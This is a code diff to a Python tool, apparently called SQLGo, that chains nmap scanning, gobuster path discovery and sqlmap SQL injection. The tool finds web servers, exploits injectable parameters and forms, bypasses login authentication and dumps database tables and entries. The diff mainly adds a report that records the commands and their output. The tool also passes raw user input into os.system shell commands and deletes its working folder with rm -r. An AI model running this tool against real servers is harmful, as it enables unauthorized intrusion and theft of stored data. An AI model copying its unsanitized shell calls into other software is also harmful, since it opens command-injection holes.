@@ -16,6 +16,7 @@ if os.geteuid() != 0:
 
 
 def nmap_scan():
+    resultnmapreport = ""
     ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")
 
     nm = nmap.PortScanner()
@@ -31,59 +32,27 @@ def nmap_scan():
         if response == "q":
             exit(0)
         else:
-            return "error"
+            return "error", "", ip_addr
 
+    print()
     for host in nm.all_hosts():
         num+= 1
-        print ('---------------------------')
-        if 80 in nm[host]['tcp']:
-            print ([num], host, '| State:', nm[host].state(), ' | Version:', nm[host]['tcp'][80]['product'], nm[host]['tcp'][80]['version'], nm[host]['tcp'][80]['extrainfo'])
+        if 80 in nm[host]['tcp'] and 443 in nm[host]['tcp']:
+            line = '[' + str(num) + ']' + ' | IP Address: ' + str(host) + ' | State: ' + str(nm[host].state()) + ' | Ports Open: 80/tcp, 443/tcp' + ' | Server: ' + str(nm[host]['tcp'][80]['product']) + str(nm[host]['tcp'][80]['version']) + " " + str(nm[host]['tcp'][80]['extrainfo']) + "\n"
+            resultnmapreport += line
+        elif 80 in nm[host]['tcp']:
+            line = '[' + str(num) + ']' + ' | IP Address: ' + str(host) + ' | State: ' + str(nm[host].state()) + ' | Ports Open: 80/tcp' + ' | Server: ' + str(nm[host]['tcp'][80]['product']) + str(nm[host]['tcp'][80]['version']) + " " + str(nm[host]['tcp'][80]['extrainfo']) + "\n"
+            resultnmapreport += line
         else:
-            print ([num], host, '| State:', nm[host].state())
-    print()
+            line = '[' + str(num) + ']' + ' | IP Address: ' + str(host) + ' | State: ' + str(nm[host].state()) + ' | Ports Open: 443/tcp' + "\n"
+            resultnmapreport += line
+    resultnmapreport += "\n"
+    print(resultnmapreport)
 
     print('Now, lets look for hidden paths in the webserver that could be exploitable')
     webserver = input('Type the IP Address that you would like to attack: ')
 
-    return webserver
-
-
-
-"""
-def nmap_scan():
-    ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")
-    cmd = "nmap -n --open " + ip_addr + " -p80,443  -sV > /usr/share/sqlgo/nmapoutput.txt"
-    try:
-        os.system(cmd)
-        parseNmapOutput()
-        #we should probably parse nmap output to see if there were zero hosts that were found
-        #if no hosts were found, give the option to run nmap scan again.
-
-    except KeyboardInterrupt:
-        print ("nmap scan failed. Run script again.")
-
-    #ask user to input a website from the nmap command output. Maybe do a check to ensure that whatever they put was output from the nmap command?
-    webserver = input("\nNow, let's look for hidden paths in the webserver that could be exploitable!\nType in the webserver you would like to attack: ")
-    return webserver
-
-def parseNmapOutput():
-    s = open("/usr/share/sqlgo/nmapoutput.txt", "r")
-    count = 0
-    line_iter = iter(s)
-
-    for line in line_iter:
-        count += 1
-        flag = True
-        if "Nmap scan report for " in line:
-            arr = line.split()
-            print(arr[-1])
-
-        if "Host is up " not in line and len(line) != 1 and "Not shown" not in line and "Nmap" not in line and "Service" not in line:
-            print(line)
-    if count == 2 or count == 3:
-        result = "No hosts found."
-        return result
-"""
+    return webserver, resultnmapreport, ip_addr
 
 
 
@@ -162,14 +131,14 @@ def sqlmap(webserver, hidden_path, option_chosen):
 
     if option_chosen == 2:
         flag[1] = True
-        curlcmd = "curl " + webserver + hidden_path + " > /usr/share/sqlgo/curloutput.txt"
+        curlcmd = "curl " + webserver + hidden_path + " > /usr/share/sqlgo/curloutput.txt 2>&1"
         os.system(curlcmd)
         paramstring = parseCurl()
         base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + "--data=" + paramstring
 
     if option_chosen == 3:
         flag[2] = True
-        curlcmd = "curl " + webserver + hidden_path + " > /usr/share/sqlgo/curloutput.txt"
+        curlcmd = "curl " + webserver + hidden_path + " > /usr/share/sqlgo/curloutput.txt 2>&1"
         os.system(curlcmd)
         paramstring = parseCurl()
         base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + "--data=" + paramstring
@@ -307,9 +276,10 @@ def table_dump(base_cmd, database):
             if response == 'q':
                 exit(0)
             else:
-                return status
+                return status, table
     except KeyboardInterrupt:
         print ("SQLMap - search for database table failed. Run script again")
+    return status, table
 
 def parseData():
     s = open("/usr/share/sqlgo/sqlmapdata.txt", "r")
@@ -355,38 +325,86 @@ def info():
     else:
         exit(0)
 
-def output_file():
-    response = input("Would you like to create a report that includes the full nmap, gobuster, and SQLMAP scans? Type 'y' for yes, anything else for no: ")
+def output_file(ip_addr, webserver, resultnmapreport, option_chosen, base_cmd, database, table_chosen):
+
+    if option_chosen == "1":
+        str = "SQLMap Option 1 Chosen: Exploit vulnerable input parameters.\n"
+    if option_chosen == "2":
+        str = "SQLMap Option 2 Chosen: Exploit form-based SQL Injection.\n"
+    if option_chosen == "3":
+        str = "SQLMap Option 3 Chosen: Bypass login authentication.\n"
+
+
+    response = input("Would you like to create a report that includes the full nmap, gobuster, and SQLMAP scans?\nType 'y' for yes, anything else for no: ")
     if response == "y":
 
         f = open('/usr/share/sqlgo/sqlgo_report.txt', 'w+')
+        f.write("################################################################################################################\n")
         f.write("BEGINNING OF REPORT\n")
+        f.write("################################################################################################################\n")
 
-        f.write("\nGOBUSTER OUTPUT - HIDDEN PATHS FOUND")
-        f.write("\n")
-        with open('/usr/share/sqlgo/gobusteroutput.txt', 'r') as file:
-            data = file.read()
-        f.write(data)
+        if(resultnmapreport != ""):
+            f.write("\n################################################################################################################\n")
+            f.write("NMAP SCAN OUTPUT - WEBSERVERS FOUND\n")
+            f.write("\nCommand: nmap -n --open -p80,443 -sV " + ip_addr)
+            f.write("\n################################################################################################################\n")
+            f.write("\n")
+            f.write(resultnmapreport)
 
-        f.write("\nSQLMAP OUTPUT - DATABASES FOUND")
-        f.write("\n")
-        with open('/usr/share/sqlgo/sqlmapoutput.txt', 'r') as file:
-            data = file.read()
-        f.write(data)
+        if(os.path.exists('/usr/share/sqlgo/gobusteroutput.txt')):
+            f.write("\n################################################################################################################\n")
+            f.write("GOBUSTER OUTPUT - HIDDEN PATHS FOUND ON THE GIVEN WEBSERVER\n")
+            f.write("\nCommand: gobuster -o /usr/share/sqlgo/gobust.txt -u " + webserver + " -w /usr/share/wordlists/dirb/common.txt > /usr/share/sqlgo/gobusteroutput.txt")
+            f.write("\n################################################################################################################\n")
+            f.write("\n")
+            with open('/usr/share/sqlgo/gobusteroutput.txt', 'r') as file:
+                data = file.read()
+            f.write(data)
 
-        f.write("\nSQLMAP OUTPUT - TABLES FOUND")
-        f.write("\n")
-        with open('/usr/share/sqlgo/sqlmapdb.txt', 'r') as file:
-            data = file.read()
-        f.write(data)
+        f.write("\n################################################################################################################\n")
+        f.write("SQLMAP OUTPUT - DATABASES FOUND\n\n")
+        if(os.path.exists('/usr/share/sqlgo/sqlmapoutput.txt') and base_cmd != "error"):
+            f.write(str)
+            f.write("\nCommand: " + base_cmd + " --dbs  --batch > /usr/share/sqlgo/sqlmapoutput.txt\n")
+            f.write("\n################################################################################################################\n")
+            f.write("\n")
+            with open('/usr/share/sqlgo/sqlmapoutput.txt', 'r') as file:
+                data = file.read()
+            f.write(data)
+        else:
+            f.write("No databases found. Unable to perform SQL Injection on this path.")
 
-        f.write("\nSQLMAP OUTPUT - ENTRIES FOUND")
-        f.write("\n")
-        with open('/usr/share/sqlgo/sqlmapdata.txt', 'r') as file:
-            data = file.read()
-        f.write(data)
 
+        f.write("\n################################################################################################################\n")
+        f.write("\nSQLMAP OUTPUT - TABLES FOUND\n\n")
+        if(os.path.exists('/usr/share/sqlgo/sqlmapdb.txt')):
+            f.write(str)
+            f.write("\nCommand: " + base_cmd + " -D " + database + " --tables --batch > /usr/share/sqlgo/sqlmapdb.txt\n")
+            f.write("\n################################################################################################################\n")
+            f.write("\n")
+            with open('/usr/share/sqlgo/sqlmapdb.txt', 'r') as file:
+                data = file.read()
+            f.write(data)
+        else:
+            f.write("No tables found. Unable to perform SQL Injection on this path.")
+
+
+        f.write("\n################################################################################################################\n")
+        f.write("\nSQLMAP OUTPUT - ENTRIES FOUND\n\n")
+        if(os.path.exists('/usr/share/sqlgo/sqlmapdata.txt')):
+            f.write(str)
+            f.write("\nCommand: " + base_cmd + " -D " + database + " -T " + table_chosen + " --dump  --batch > /usr/share/sqlgo/sqlmapdata.txt\n")
+            f.write("\n################################################################################################################\n")
+            f.write("\n")
+            with open('/usr/share/sqlgo/sqlmapdata.txt', 'r') as file:
+                data = file.read()
+            f.write(data)
+        else:
+            f.write("No entries found. Unable to perform SQL Injection on this path.")
+
+        f.write("\n################################################################################################################\n")
         f.write("END OF REPORT")
+        f.write("\n################################################################################################################\n")
 
         print()
         print("Report created. The path to the report is: /usr/share/sqlgo/sqlgo_report.txt. Goodbye!")
@@ -398,15 +416,20 @@ def execute_sqlgo():
 
     if(os.path.exists('/usr/share/sqlgo/')): #clears folder if it exists to avoid having information from two seperate application runs
         cmd = "rm -r /usr/share/sqlgo"
-        try:
-            os.system(cmd)
-        except KeyboardInterrupt:
-            print ("Deleting folder failed - fix this")
-    os.mkdir('/usr/share/sqlgo')
+        userresponse = input("There exists a SQLGo report from a previous run of this tool.\nPress 'c' to delete the existing folder and continue with the application. Press anything else to quit: ")
+        if userresponse == 'c':
+            try:
+                os.system(cmd)
+            except KeyboardInterrupt:
+                print ("Deleting folder failed - QUITTING")
+            os.mkdir('/usr/share/sqlgo')
+        else:
+            print("The path to the existing folder from the last run of this tool is: /usr/share/sqlgo. Goodbye!")
+            exit(0)
 
-    webserver = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
+    webserver, resultnmapreport, ip_addr = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
     while webserver == "error":
-        webserver = nmap_scan()
+        webserver, resultnmapreport, ip_addr = nmap_scan()
 
     pathlist, response = gobuster(webserver)
     while pathlist == "error":
@@ -422,6 +445,7 @@ def execute_sqlgo():
             print("All options of SQLMap have been chosen. This path is not vulnerable to SQL injection.")
             userinput = input("Press 'q' to quit the application or anything to display the hidden paths again: ")
             if userinput == 'q':
+                output_file(ip_addr, webserver, resultnmapreport, option_chosen, base_cmd, "", "")
                 exit(0)
             else:
                 print()
@@ -451,16 +475,16 @@ def execute_sqlgo():
         status, tables = database_search(base_cmd, database_list)
 
 
-    datastatus = table_dump(base_cmd, status)
+    datastatus, table_chosen = table_dump(base_cmd, status)
     while datastatus == "error":
         print()
         print("Available Tables:")
         for table in tables:
             print(table)
         print()
-        datastatus = table_dump(base_cmd, status)
+        datastatus, table_chosen = table_dump(base_cmd, status)
 
-    output_file()
+    output_file(ip_addr, webserver, resultnmapreport, option_chosen, base_cmd, status, table_chosen)
 
 if __name__ == "__main__":
     response = intro()
@@ -468,4 +492,3 @@ if __name__ == "__main__":
         info()
     else:
         execute_sqlgo()
-
